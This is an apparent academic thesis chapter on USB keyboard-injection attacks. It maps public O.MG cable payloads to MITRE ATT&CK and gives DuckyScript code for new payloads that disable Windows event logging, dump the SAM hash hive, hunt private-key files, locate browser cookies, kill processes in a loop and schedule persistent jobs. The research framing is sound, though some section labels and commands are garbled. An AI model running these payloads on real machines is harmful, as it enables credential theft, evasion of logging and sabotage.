\chapter{Methodology and Architecture} \label{Methodology}

\section{Introduction}

This chapter will describe the point of view of an attacker during a HID injection attack. To this end it will firstly evaluate existing attack payloads, describe a general architecture for an attack  it will introduce new attacks and their architecture are well as novel defense methods against those attacks. 


\section{Ethical Considerations}
Attacks as described in this thesis can cause considerable harm to individuals, companies, and communities. For all the reasons explained and examples brought up in section \ref{TheDangersOfUSB} these attacks are not to be taken lightly and the potential for damage is real. For this exact reason it is important to raise awareness for this kind of attack, research existing vulnerabilities, new developments in the field, and how those can be counteracted. Investigating attacks in particular ones that are not available in a public GitHub repository is an important contribution to the scientific field and outweighs the negative. Just because these payloads cannot easily be found, does not mean they do not already exist. Which arguably makes them even more dangerous to the public and therefore their exploration is even more urgent. \\
In section \ref{HistoryOfDefense} this thesis explains countermeasures that can be put in place to protect oneself and in section [TODO!!] new methods will be presented, specifically against new attacks introduced in section \ref{Implementation}.
% bring up the balck/white /grey hat discussion again? or is his not scientific enough?


\section{ATT\&CK by MITRE}

ATT\&CK \cite{MITREATTCK} is an openly accessible knowledge base of adversary tactics and techniques developed by the security advisor firm MITRE \cite{WhoWeAre}. It can be used for threat modeling and to get a general overview over the different types of cyber attacks that happen in the world.
It features 14 attack categories that themselves are subdivided into 8-43 techniques. One example is the category Reconnaissance which is divided into Active Scanning, Gather Victim Host Information, Gather Victim Identity Information, Gather Victim Network Information, Gather Victim Org Information, Phishing for Information, Search Closed Sources, Search Open Technical Databases, Search Open Websites/Domains, Search Victim Owned Websites. 



\subsection{Evaluation of Existing Attack Scripts}

In the following, this thesis will dive into some of those categories and techniques and evaluate whether that can be executed via keyboard injection and whether or not a script for it is available online. To this end, scripts from the official open source GitHub page for O.MG \footnote{https://github.com/hak5/omg-payloads} by Hak5 are examined. \\
It is important to note that the most basic attack that can be executed via Keyboard Injection is also the most versatile and one of the most dangerous ones. It is a simple script that downloads any malware of your choice, which as a result, could execute any software based attack.  
This analysis will therefore focus on whether an attack has been implemented solely as keyboard injection and will not feature payloads that include downloading additional malware. It will not examine all 14 categories and instead highlight the most relevant ones. 

\subsubsection{Reconnaissance}

Reconnaissance is about actively or passively gathering information, often used before an attack. The gathered information can be used to inform the planning of a bigger attack or to further additional reconnaissance efforts. This category includes scanning of network traffic, gathering host information such as name, IP, operating system, hardware information, credentials, email, or information about their network. Phishing also belongs into this category, and purchasing information about the system from legal or illegal data brokers as well as gathering publicly available information, for example from the internet \cite{MITREATTCK}.

This is a field in which keyboard injection can make considerable damage. There exist many exfiltration scripts, that download sensitive files, exfiltrate passwords, network information, and device information, or social engineer the user to enter sensitive data on malicious sites. 

For example, \verb|Harvester_OF_SORROW| \cite{OmgpayloadsPayloadsLibrary} exfiltrates login information from Firefox on Windows 10. \\ 
Other examples for password extraction are \verb|SudoSnatch| \cite{OmgpayloadsPayloadsLibrary} which exfiltrates sudo passwords, and \verb|WLAN-Windows-Passwords| \cite{OmgpayloadsPayloadsLibrary}which steals wlan passwords and sends them to the attacker via a discord webhook. 
\verb|OMGLogger| \cite{OmgpayloadsPayloadsLibrary} leverages the logging capabilities of the O.MG cable and sends the keystrokes live to the attacker's server. \\
The collection on GitHub has an entire folder for exfiltration scripts, that can find data on a network, a printer, a target's Spotify, Powershell history, log files, MySql history, FireFox browser cookies, fotos, or send periodic screenshots. \\
Similarly there is a folder with scripts on phishing  \cite{OmgpayloadsPayloadsLibrary}, however, it is less extensive. The three payloads build on the idea of faking a pop up, where they prompt the user to (re)submit login data and all require some previous installations to be present and they are all written for Linux. \\
The recon folder contains a script that does device recon using a Powershell script that can be hosted on a server and then downloaded via keyboard injection. 


\subsubsection{Resource Development}

Resource Development is what a malicious actor does when they want to establish resources that can help them mount an attack, such as getting access to specific email addresses, system accounts, or target system. It also includes setting up servers or bots that could be used for an attack or creating and cultivating accounts to build a persona \cite{MITREATTCK}.\\
Resource Development is an important part of injection attacks in conjunction with data exfiltration. This is apparent in payloads like \verb|ExfiltrateLinuxLogFiles| \cite{OmgpayloadsPayloadsLibrary}, \verb|WLAN-Windows-Passwords| \cite{OmgpayloadsPayloadsLibrary}, \verb|-OMG-Credz-Plz| \cite{OmgpayloadsPayloadsLibrary}, or \verb|OMG-AwarenessTraining| \cite{OmgpayloadsPayloadsLibrary} which send the exfiltrated data to a webhook, discord webhook, or Dropbox. Any kind of passing on of data from the O.MG cable to the attacker will require some resource for communication. 


\subsubsection{Initial Access}

Initial Access is about an adversary trying to get access to a target network\cite{MITREATTCK}. One example for how this can be done with keyboard injection are \verb|revshell_windows| and \verb|win_winrm-backdoor| \cite{OmgpayloadsPayloadsLibrary}; payloads that establish remote control over a targeted computer. Through that access point, the network can be infiltrated. Similarly, passwords for networks can be exfiltrated from a target computer using \verb|WLAN-Windows-Passwords| \cite{OmgpayloadsPayloadsLibrary}.\\

\subsubsection{Execution}

Execution covers all techniques used to get malicious code running on a target's computer or server using any kind of shell, coding environment, hotkeys, native APIs, or rely on the user to activate code execution, e.g. by clicking on a link or file.\cite{MITREATTCK}\\
Running malicious code is a core component to the way Keyboard Injections are done. It is their alpha and omega and can be found in every script in the collection.

\subsubsection{Persistence} \label{persistence}

Persistence stresses the longevity and robustness of an attack over time, changed credentials. To this end, accounts and access rights can be manipulated, SSH keys stolen or modified, new devices registered for two factor authentication, create or modify system processes (i.e. modifying power shell profile scripts), by using external remote services, or manipulate pre-OS boot mechanisms.\cite{MITREATTCK} \\
An example for this kind of technique is the remote access that can be gained by scripts like \verb|revshell_macOS| \cite{OmgpayloadsPayloadsLibrary} or remote control access establishment as demonstrated by \cite{bojovicRisingThreatHardware2019}. \\
This category also includes attack scheduling, which can easily be achieved by DuckyScript, using the `DELAY` command, the remote trigger, or the Geo fencing \cite{hak5MGCable}.

\subsubsection{Privilege Escalation}

Privilege Escalation includes techniques used to gain higher-level permissions in a network or system, by bypassing account controls, abusing elevation control mechanisms, access token manipulation or theft, account manipulation, braking out of containers to gain access to a host \cite{MITREATTCK}, and many similar techniques as featured in \ref{persistence}. \\
Account manipulation can easily be achieved with the correct recon. Especially if the login of an administrator can be logged \verb|OMGLogger| \cite{OmgpayloadsPayloadsLibrary} or is stored somewhere on the system \verb|SudoSnatch| \cite{OmgpayloadsPayloadsLibrary}, \verb|Everything-Password-Stealer| \cite{OmgpayloadsPayloadsLibrary} privilege escalation is achievable.

\subsubsection{Credential Access}

Credential Access means an adversary tries to steal usernames and passwords \cite{MITREATTCK}, which is a common application for the GitHub scripts, as mentioned in the previous subsections. Examples are \verb|SudoSnatch| \cite{OmgpayloadsPayloadsLibrary}, \verb|Everything-Password-Stealer| \cite{OmgpayloadsPayloadsLibrary}, or with BadUSB;  \cite{muslimImplementationAnalysisUSB2020}. 


\subsubsection{Collection}
After a target has been infiltrated, the data collection process can start. It includes of techniques like Man-in-the-Middle (MIM), compressing data, browser session hijacking, audio and or image capture, clipboard data exfiltration, email collection, keylogging, etc. \cite{MITREATTCK} \\
Keylogging specifically is one of the main features of the O.MG cable, as discussed previously, and further extended by \verb|Persistent_Keylogger-Telegram_Based|  \cite{OmgpayloadsPayloadsLibrary}, image capture is demonstrated by \verb|Screen-Shock| \cite{OmgpayloadsPayloadsLibrary}, or the stealing of fotos by \verb|/ExfiltratePhotosThroughShell| \cite{OmgpayloadsPayloadsLibrary}. 


\subsubsection{Exfiltration}

Exfiltration is about how the stolen data can be relayed to the attacker \cite{MITREATTCK}. As discussed in the section about Data Reconnaissance, exfiltration can happen in a variety of ways. The examples from the GitHub repositories include sending the data to (discord) webhooks, dropbox  ( \verb|ExfiltrateLinuxLogFiles|, \verb|WLAN-Windows-Passwords|, \verb|-OMG-Credz-Plz|, or \verb|OMG-AwarenessTraining|  \cite{OmgpayloadsPayloadsLibrary}).

\subsubsection{Impact}

The techniques belonging to impact are not widely represented in the GitHub repository. They include scripts that try to manipulate, interrupt or destroy systems and data \cite{MITREATTCK}. However, it has been shown by \cite{lawalFacilitatingCyberenabledFraud2022} that it is possible to change, meaning manipulate, data on a target's computer without leaving traces of an attack, thereby framing the computer's user(s) for the data change. 


\subsubsection{Intermediate Conclusion}

From the examples above it is apparent, that a wide variety of attacks and techniques are available with DuckyScript and a malicious USB device. Many sections of the \verb|Att&ck| model play a role and are part of various scripts for the O.MG cable that already exist. The section that is most prevalent in the available code base is focused on the gathering and exfiltration of data and gaining access to systems and networks. 


\section{Setup for an HID Injection Attack}

When preparing for an HID injection attack, a malicious actor has to pay attention to the following 5 points;
\begin{enumerate}
    \item Target
    \item Circumstance and Place
    \item Time and Timing
    \item required Hardware
    \item required Software
\end{enumerate}


\subsubsection{Target}

The foremost component to an attack is the target. It determines all other factors. Crucial is the goal of the attack, the level of available access, and the environment and characteristics of the target.\\
The goal determines the type of attack, which will be further specified by the environment, chaarcteristics and access. [where am i going with this, in how far is it even relevant?] 


\section{Methodology} \label{methodology}

\subsection{Intro}

This section will give an overview over the methodologies of the developed payloads and defenses. Their implementations will be discussed in the next section \ref{Implementation}


\subsection{Payloads}

Payloads can follow either or a combination of two main strategies; 
\begin{enumerate}
    \item User Interface (UI) based
    \item Command Line Interface (CLI) based
\end{enumerate}

UI based payloads follow the line of action a typical UI focused User would take. For example, for sending an email, such a user might search for the email application icon on their desktop, click on it, then click on 'new Mail' and fill out all the fields of the mail form, then click on send. A payload that mimics this behaviour, would navigate in the same way, just using the keyboard instead of the mouse. For instance, if the outlook icon was the fourth icon on the taskbar, it could be selected with Windows key + 3. The 'new Mail' button would be reached with 16 tabs or by using  Ctrl + N. The entire payload would be constructed in such a manner, navigating the expected UI. \\
The issues that might arise here become clear fast; how would you know, where on the taskbar outlook is located? What if the computer is not connected to the internet and instead of opening outlook an error message pops up? What if the computer is very slow and the Ctrl + N is sent before the email application has fully loaded?  Some of these issues can be accounted for, outlook for instance can also be opened by searching for it in the start menu, however determining whether the application has loaded is impossible with the O.MG cable. The risk can be mitigated by impelementing long delays between commands, however, this also creates a lit of time overhead which can be a big drawback in time sensitive situations. \\

Fewer detail problems of this sort are caused by the CLI approach. It allows for a generally more clean and concise execution of an attack. It simplifies many actions and is often more direct and therefore faster. Take the mail example again. Powershell has a cmdlet that allows you to send email directly. This cuts down nearly all navigation and the risks and time overhead that come with it. \\
Drawbacks of this method might be that it can be more easily detected since it is such unexpected user behaviour. An average use would not use the command line to send an email, if they ever even use a command line. Therefore actions like opening the Windows run window and starting powershell.exe can easily be flagged as suspicious behaviour. Another obstacle might be user priviledges. Some commands require admin access, which is easy to deal with if the target is the admin user on the computer (simply deal with the popup) but requires the admin user's password if the target is not admin themselves. 


Payloads can either have some kind of impact on the system, be used to exfiltrate some data or both.

In the following, developed payloads will be presented.

\subsubsection{Register Email Forwarding}

For reconnaissance it is always interesting to spy on the emails a (potential) victim might receive, to see personal, maybe sensitive information, or possibly also to get access to two factor authentication codes in order to be able to log in somewhere. One simple way to achieve this, which is not yet present in the official O.MG payload repository, is by registering email forwarding. 



\subsubsection{Disable Windows Event Logging}

Windows event logging is a built in windows functionality that does logs the system's activity. There are multiple event types; Error, Warning, Information, Success Audit, Failure Audit logged in multiple different categories; System Log, Application Log, Security, Setup and Forwarded Events. 
Some actions on a system might raise errors, warnings or other types of events in one of the logs, indicating that an attack has taken or is taking place. In order to avoid being found out during or after the attack, a hacker might therefore attempt to disable the logging to leave as few traces as possible. For this reason, this kind of attack is classified under the ATT\&CK Defense Evasion category. \\
There are multiple ways to disable windows event logging, in the implementation chapter, an UI option and a CLI option will be presented. 


\subsubsection{Extract SSH hashes}

The Security Account Registry (SAM) on windows stores passwords as hashes. These hashes can be exfiltrated and used to spoof the victim. This is used as a technique in the Att\&ck lateral movement and Defense Evasion techniques \cite{UseAlternateAuthentication}. \\
Access to these files is restricted to admin privileges on Windows, so this payload also has to contain and admin access step.

\subsubsection{Extract Private Key Files}

Public key cryptography builds on the notion of private and public keys that are calculated from a shared mathematical basis, such as the difficulty of factoring large prime numbers (in RSA) or solving the discrete logarithm problem (in EC). While it is extremely time and resource consuming to try and reverse these calculations, one more simple way to breach this security mechanism is to simply steal the keys. Often, such private keys are stored in private key files that have corresponding file extensions and are stored in common file locations. Therefore, it is possible to search default directories for private key files for the mentioned file extensions and extract them.    


\subsubsection{Steal Web Session Cookies}

While most of the information stored in web session cookies might not be sensitive, it can always be used for reconnaissance and learning about a target's habits and likes which can help plan other attacks. However, the information can also include authentication tokens that are used as session cookies after a login \cite{StealWebSession}. The files in which this data is stored can be extracted from a client machine. \\
An attack that does this, first has to determine which browser should be targeted. For this, an attacker might search for the information of the default browser, send that information to a command server and then determine which extraction payload to trigger, based on that information. 


\subsubsection{Iteratively End Processes} \label{Iteratively End Processes}

One underexplored area of the Mitre Att\&ck framework is the persistance category. This Payloads aims to achieve persistance by iteratively ending running processes. There's two modes to the payload; white- and blacklist. It can easily be modified to only end a predefined set of application when it detects them as running, or it can end everything except for a predefined set of applications. This modification can be done depending on the goal of the attacker. 


\subsubsection{Schedule Processes}

One under explored area of the Mitre Att\&ck framework is persistence. This Payloads aims to achieve persistence by registering processes that will run iteratively depedning on a customizable trigger. This processes can be anything from recon scripts, to other persistence payloads, like for example the end processes payload \ref{Iteratively End Processes} which could run in the background if set up like this.


\section{Implementation} \label{Implementation}

\subsection{Payloads}

\subsubsection{Register Email Forwarding}

This payload is UI based, since it is using outlook. The difficulty for using the command line, or any tool really, is that it is designed to work without knowing the user's password. So using the most widely used email client, Outlook, is a natural approach. \\
The payload opens Outlook through the Windows search menu, waits a considerable amount of time to let it start up and then navigates to the correct menu. This is a good example for how tricky it can be to use the UI approach; every menu option that is selected, prompts a small load delay that has to be factor into the payload. Simply running all the navigation and selection without or with small delays only, can very swiftly derail the attack because the computer simply is not yet ready for the next command. \\
Once the payload has navigated to the correct menu, it can select the email for which the forwarding should be selected and where the emails should be forwarded to. After that, it closes the menu. One important thing to know for this payload is that this action will prompt a little dialogue window in the top right corner when the application is opened for the first time after the settings change, reminding the user of the new forwarding. Therefore, in order to mask their steps, the attacker should restart outlook to close the message such that the victim has less chance of discovering the attack. \\
To illustrate this attack the following lines show some of the navigational steps:


\begin{lstlisting}
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
ENTER
DELAY 2000
TAB
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
DOWNARROW
DELAY 100
\end{lstlisting}

Of course, the delay (in milliseconds) can be adjusted depending on the expected speed of the target machine. 




\subsubsection{Disable Windows Event Logging}

This thesis presents two approaches to windows event logging.

\textbf{UI} 

This implementation opens the Windows Event log application through the Windows Run window and navigates to the correct pane where it disables the logging.
This approach mimics the action of a UI focused user. As explained in section \ref{methodology} this has some drawbacks attached to it, namely the risk of unexpected UI behaviour and irregular loading times. This payload snippet exemplifies the approach of adding long delaysin between commands to ensure all actions are executed to completion before triggering the next command.\\
The implementation of this payload contains a lot of tabs, due to the navigational nature. This is an excerpt for illustration:

\begin{lstlisting}
DELAY 1000
TAB
DELAY 2000
STRING m
DELAY 2000
TAB
DELAY 2000
ENTER
DELAY 6000
TAB
DELAY 2000
TAB
DELAY 2000
TAB
DELAY 2000
TAB
DELAY 2000
\end{lstlisting}

\textbf{CLI}

Using the Command Line for this attack does not have the same weaknesses as the UI approach. There is less chance for unexpected pop ups and since it is much shorter and requires fewer steps, loading times don't have as big an impact. On the other hand, executing admin level commands might pose a problem, as discussed in section \ref{methodology} \\

Once the admin problem has been navigated, the payload is straightforward and consists of entering to commands and closing the Powershell window.
The CLI appraoch is more reliable and concise, however, it requires admin privileges for the shell. This can be achieved through the WinX menu, where the admin shell is opened directly. Then the payload consists only of a few more lines:

\begin{lstlisting}
STRINGLN Stop-Service -Name "eventlog"
DELAY 200
STRINGLN Set-Service -Name "eventlog" -StartupType Disabled
DELAY 300
STRINGLN exit
\end{lstlisting}


\subsubsection{Extract SSH hashes}

Hash's associated keys, subkeys, and values make up a hive that can be exfiltrated from the windows system by storing it in a file and the sending that file to a command server. \\
Once admin privileges on a terminal have been secured, this is a straight forward process. 


 \begin{lstlisting} 
 STRINGLN reg save HKLM\SAM C:\sam.hiv
 \end{lstlisting}

\subsubsection{Extract Private Key Files}

File extensions can be searched with the help of Powershell. For that reason, this extraction payload will run a simple loop on a predefined (default) path to a directory that is expected to contain private key files and send the discovered files to a command server. 

\begin{lstlisting}
DUCKY_LANG DE_CH
DELAY 50
GUI r
DELAY 200
STRINGLN powershell.exe
DELAY 2500
STRINGLN $entryPoint = "your/path"
DELAY 200
STRINGLN $extensions = @(".key", ".pgp", ".gpg", ".ppk", ".p12", ".pem", ".pfx", ".cer", ".p7b", ".asc")
DELAY 200
STRINGLN Get-ChildItem -Path $entryPoint -Recurse | ForEach-Object {
DELAY 200
STRINGLN     if ($_.PSIsContainer) {
DELAY 200
STRINGLN         return
DELAY 200
STRINGLN     }
DELAY 200
DELAY 200
STRINGLN     if ($extensions -contains $_.Extension) {
DELAY 200
STRINGLN         Write-Host "File found: $($_.FullName)"
DELAY 200
STRINGLN     }
DELAY 200
STRINGLN }
DELAY 50
ENTER
DELAY 200
STRINGLN exit
\end{lstlisting}


\subsubsection{Steal Web Session Cookies}

A client's default browser can be extracted via Powershell using only one line:
\begin{lstlisting}
STRINGLN Get-ItemProperty -Path 'HKCU: Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice' | Select-Object -ExpandProperty ProgId
\end{lstlisting}

After that information is sent back to the attacker, they can connect to the cable and remotely trigger the appropriate attack. For example, if the victim's default browser is firefox, they could start a terminal, navigate to the default directory for firefox cookies and extract that file.

\begin{lstlisting}
STRINGLN cd "C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\umva4gfp.default-release\cookies.sqlite"
\end{lstlisting}

The same approach can be used for chrome, the difference is in the file path.

\begin{lstlisting}
STRINGLN cd "C:\Users\maaik\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
\end{lstlisting}

\subsubsection{Iteratively End Processes}

Finding and ending processes on Windows can be done with powershell and without admin privileges. The payload first defines the black- or whitelist, depending on the mode of the attack, then gets a list of all running processes. Next, it will either end all running processes that are also in the whitelist, or it will end every running process that is not in the blacklist. \\
This is an excerpt of the whitelist mode;

\begin{lstlisting}
STRINGLN $criticalProcessesWhitelist = @( "firefox" , "ROCCAT_Swarm_Monitor", "Notepad" )
DELAY 5
STRINGLN while("true"){
DELAY 5
STRINGLN $runningProcesses = Get-Process | Select-Object -ExpandProperty Name | select -Unique
DELAY 5
STRINGLN foreach ($process in $runningProcesses) {
DELAY 5
STRINGLN if ($criticalProcessesWhitelist -contains $process) {
DELAY 5
STRINGLN Stop-Process -Name $process
DELAY 5
STRINGLN Write-Output "process $process deleted"
DELAY 5
STRINGLN }
DELAY 5
STRINGLN }
DELAY 5
STRINGLN Start-Sleep -Seconds 1.5
DELAY 5
STRINGLN }
\end{lstlisting}

The program features a while loop, which will keep it running continuously. It also includes a sleep to give the operating system time to actually terminate a process, before running Get-Process again thereby avoiding attention drawing error messages. In order for this payload to run, it is essential that the name in the white- or blacklist match exactly what the process name is that is returned by the Get-Process Powershell function. 



\subsubsection{Schedule Processes}

Windows Processes can be scheduled via powershell with admin privileges. As soon as that is achieved, a job trigger can be chosen. There is a wide variety to chose from, such as time intervals in seconds, minutes, days, even weeks, random delays, repetition for a set duration, or events such as logon or start up \cite{sdwheelerNewJobTriggerPSScheduledJobPowerShell}.
For the purpose of this demonstration, logon is used. \\
Similarly, some job options can also be configured, they can be things like '-ContinueIfGoingOnBattery' , -HideInTaskScheduler, -IdleTimeout (how long is the computer idle before the job starts), -RequireNetwork, and many more \cite{sdwheelerSetScheduledJobOptionPSScheduledJobPowerShell}. \\
After these settings have been defined, the job itself is registered and the Powershell window can be closed. \\


\begin{lstlisting}
DELAY 2000
STRINGLN $trigger = New-JobTrigger -AtLogon
DELAY 200
STRINGLN $options = New-ScheduledJobOption -StartIfOnBattery
DELAY 200
STRINGLN Register-ScheduledJob -Name ProcessJob -ScriptBlock {*enter script*} -Trigger $trigger -ScheduledJobOption $options
DELAY 200
\end{lstlisting}
